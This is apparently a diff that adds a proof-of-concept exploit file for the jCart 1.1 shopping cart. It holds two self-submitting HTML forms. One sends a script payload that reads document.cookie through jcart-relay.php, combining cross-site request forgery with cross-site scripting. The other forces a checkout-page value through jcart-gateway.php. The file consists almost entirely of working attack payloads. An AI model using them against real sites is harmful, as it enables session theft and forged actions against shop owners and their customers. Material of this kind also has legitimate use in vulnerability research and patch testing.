@@ -1,0 +1,24 @@
+&lt;html&gt;
+        &lt;form action=&quot;http://www.example.com/jcart-1.1/jcart/jcart-relay.php&quot; method=&quot;POST&quot;&gt;
+          &lt;input name=&quot;my-item-id&quot; value=&quot;3&quot; type=&quot;hidden&quot;&gt;
+          &lt;input name=&quot;my-item-qty&quot; value=&quot;1&quot; type=&quot;hidden&quot;&gt;
+          &lt;input name=&quot;my-item-name&quot; value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; type=&quot;hidden&quot;&gt;
+          &lt;input name=&quot;my-item-price&quot; value=&quot;33.25&quot; type=&quot;hidden&quot;&gt;
+          &lt;input id=&quot;payload&quot; name=&quot;my-add-button&quot; value=&quot;add to cart&quot; class=&quot;button&quot; type=&quot;submit&quot;&gt;
+          &lt;/form&gt;
+          &lt;script&gt;
+            document.getElementById('payload').click()
+        &lt;/script&gt;
+ &lt;/html&gt;
+ 
+
+ 
+&lt;html&gt;
+        &lt;form action=&quot;http://www.example.com/jcart-1.1/jcart/jcart-gateway.php&quot; method=&quot;POST&quot;&gt;
+          &lt;input name=&quot;jcart_checkout_page&quot; value=&quot;http://www.example.com&quot; type=&quot;hidden&quot;&gt;
+          &lt;input id=&quot;payload&quot; name=&quot;my-add-button&quot; value=&quot;add to cart&quot; class=&quot;button&quot; type=&quot;submit&quot;&gt;
+          &lt;/form&gt;
+          &lt;script&gt;
+            document.getElementById('payload').click()
+        &lt;/script&gt;
+&lt;/html&gt;
